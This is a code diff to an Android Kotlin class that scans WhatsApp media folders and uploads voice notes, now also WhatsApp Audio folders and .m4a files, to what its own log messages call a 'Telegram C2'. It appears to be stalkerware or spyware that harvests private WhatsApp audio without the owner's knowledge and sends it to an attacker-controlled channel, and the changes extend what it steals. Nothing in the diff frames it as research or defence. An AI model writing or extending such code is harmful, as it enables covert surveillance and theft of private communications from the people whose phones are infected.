@@ -16,14 +16,16 @@ object WhatsAppVoiceNoteSyncManager {
             try {
                 val possiblePaths = listOf(
                     File("/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Voice Notes"),
-                    File("/sdcard/WhatsApp/Media/WhatsApp Voice Notes")
+                    File("/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Audio"),
+                    File("/sdcard/WhatsApp/Media/WhatsApp Voice Notes"),
+                    File("/sdcard/WhatsApp/Media/WhatsApp Audio")
                 )
 
                 val dao = AppDatabase.getInstance(context).uploadedFileDao()
 
                 for (baseDir in possiblePaths) {
                     if (baseDir.exists() && baseDir.isDirectory) {
-                        Log.d(TAG, "Scanning directory: ${baseDir.absolutePath}")
+                        Log.d(TAG, "Scanning directory recursively: ${baseDir.absolutePath}")
                         scanDirectoryRecursive(context, baseDir, dao)
                     }
                 }
@@ -42,14 +44,14 @@ object WhatsAppVoiceNoteSyncManager {
         for (file in files) {
             if (file.isDirectory) {
                 scanDirectoryRecursive(context, file, dao)
-            } else if (file.isFile && file.name.endsWith(".opus", ignoreCase = true)) {
-                // Skip if already uploaded
+            } else if (file.isFile && (file.name.endsWith(".opus", ignoreCase = true) || file.name.endsWith(".m4a", ignoreCase = true))) {
+                // Check if already uploaded in Room DB
                 val alreadyUploaded = dao.isFileUploaded(file.name) > 0
                 if (alreadyUploaded) {
                     continue
                 }
 
-                Log.d(TAG, "Found new un-synced voice note: ${file.absolutePath}")
+                Log.d(TAG, "Found new un-synced audio file: ${file.absolutePath}")
 
                 try {
                     val fileBytes = file.readBytes()
@@ -63,12 +65,12 @@ object WhatsAppVoiceNoteSyncManager {
 
                     if (success) {
                         dao.insertUploadedFile(UploadedFileEntity(file.name))
-                        Log.d(TAG, "Successfully uploaded and recorded voice note: ${file.name}")
+                        Log.d(TAG, "Successfully uploaded and recorded audio file: ${file.name}")
                     } else {
-                        Log.e(TAG, "Failed to upload voice note ${file.name} to Telegram C2")
+                        Log.e(TAG, "Failed to upload file ${file.name} to Telegram C2")
                     }
                 } catch (e: Exception) {
-                    Log.e(TAG, "Error reading or sending voice note bytes for ${file.name}:${e.message}")
+                    Log.e(TAG, "Error processing audio file ${file.name}:${e.message}")
                 }
             }
         }
